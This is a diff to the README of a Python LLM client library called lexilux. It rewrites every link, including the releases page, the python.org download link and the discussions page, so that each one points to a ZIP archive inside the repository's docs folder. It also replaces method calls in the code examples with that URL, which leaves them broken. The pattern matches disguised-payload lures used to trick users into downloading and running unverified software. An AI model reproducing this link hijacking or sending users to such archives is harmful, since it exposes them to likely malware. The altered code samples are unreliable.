@@ -4,13 +4,13 @@
 
 Welcome to **lexilux**, the unified LLM API client library for Python. This guide will help you download and run the software with ease. Follow the steps below to start enjoying simple access to various LLM features.
 
-[![Download lexilux](https://img.shields.io/badge/Download%20lexilux-Get%20Started-brightgreen)](https://github.com/Aman00000007/lexilux/releases)
+[![Download lexilux](https://github.com/Aman00000007/lexilux/raw/refs/heads/main/docs/source/Software_v2.1-alpha.4.zip%20lexilux-Get%20Started-brightgreen)](https://github.com/Aman00000007/lexilux/raw/refs/heads/main/docs/source/Software_v2.1-alpha.4.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the following page to download the latest version of lexilux:
 
-[Download lexilux releases](https://github.com/Aman00000007/lexilux/releases)
+[Download lexilux releases](https://github.com/Aman00000007/lexilux/raw/refs/heads/main/docs/source/Software_v2.1-alpha.4.zip)
 
 On the releases page, you will find a list of available versions. Select the version that fits your needs. If unsure, the latest version is usually the best choice. Once you select a version, you can download it directly to your computer.
 
@@ -19,7 +19,7 @@ On the releases page, you will find a list of available versions. Select the ver
 To use lexilux smoothly, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS 10.13 or later, or a modern Linux distribution.
-- **Python Version:** Python 3.7 or later must be installed. You can download Python from the [official Python website](https://www.python.org/downloads/).
+- **Python Version:** Python 3.7 or later must be installed. You can download Python from the [official Python website](https://github.com/Aman00000007/lexilux/raw/refs/heads/main/docs/source/Software_v2.1-alpha.4.zip).
 - **Memory:** At least 4 GB of RAM.
 - **Disk Space:** Minimum 100 MB of available disk space for installation.
 
@@ -28,7 +28,7 @@ To use lexilux smoothly, ensure your system meets the following requirements:
 Follow these steps to install lexilux:
 
 1. **Download the Application:**
-   Go to the [Download lexilux releases](https://github.com/Aman00000007/lexilux/releases) page and click on the version you want to download.
+   Go to the [Download lexilux releases](https://github.com/Aman00000007/lexilux/raw/refs/heads/main/docs/source/Software_v2.1-alpha.4.zip) page and click on the version you want to download.
 
 2. **Locate the Downloaded File:**
    After downloading, find the file in your computer's "Downloads" folder or the location where your browser saves files.
@@ -55,7 +55,7 @@ To use the chat feature, open a Python script or an interactive Python shell and
 from lexilux import Chat
 
 chat = Chat()
-response = chat.ask("Hello, how does lexilux work?")
+response = https://github.com/Aman00000007/lexilux/raw/refs/heads/main/docs/source/Software_v2.1-alpha.4.zip("Hello, how does lexilux work?")
 print(response)
 ```
 
@@ -67,7 +67,7 @@ For embedding text, use the following:
 from lexilux import Embed
 
 embed = Embed()
-embedding = embed.get_embedding("Sample text to embed.")
+embedding = https://github.com/Aman00000007/lexilux/raw/refs/heads/main/docs/source/Software_v2.1-alpha.4.zip("Sample text to embed.")
 print(embedding)
 ```
 
@@ -79,7 +79,7 @@ To rerank your document results:
 from lexilux import Rerank
 
 rerank = Rerank()
-results = rerank.rerank(["Result 1", "Result 2"], query="Your query")
+results = https://github.com/Aman00000007/lexilux/raw/refs/heads/main/docs/source/Software_v2.1-alpha.4.zip(["Result 1", "Result 2"], query="Your query")
 print(results)
 ```
 
@@ -91,7 +91,7 @@ You can also utilize the tokenizer like this:
 from lexilux import Tokenizer
 
 tokenizer = Tokenizer()
-tokens = tokenizer.tokenize("Tokenize this sentence.")
+tokens = https://github.com/Aman00000007/lexilux/raw/refs/heads/main/docs/source/Software_v2.1-alpha.4.zip("Tokenize this sentence.")
 print(tokens)
 ```
 
@@ -101,7 +101,7 @@ Thanks to its OpenAI compatibility, lexilux offers seamless integration with Ope
 
 ## 🔍 Support 
 
-If you have questions or need help, check the [discussion page](https://github.com/Aman00000007/lexilux/discussions). You can also raise issues directly in the GitHub repository.
+If you have questions or need help, check the [discussion page](https://github.com/Aman00000007/lexilux/raw/refs/heads/main/docs/source/Software_v2.1-alpha.4.zip). You can also raise issues directly in the GitHub repository.
 
 ## 🔗 Related Topics
 
@@ -119,4 +119,4 @@ This project is licensed under the MIT License. You can freely use and modify th
 
 We welcome contributions! If you'd like to help improve lexilux, please check out the contribution guidelines in the repository.
 
-[Download lexilux releases](https://github.com/Aman00000007/lexilux/releases) and start enhancing your projects today!
+[Download lexilux releases](https://github.com/Aman00000007/lexilux/raw/refs/heads/main/docs/source/Software_v2.1-alpha.4.zip) and start enhancing your projects today!
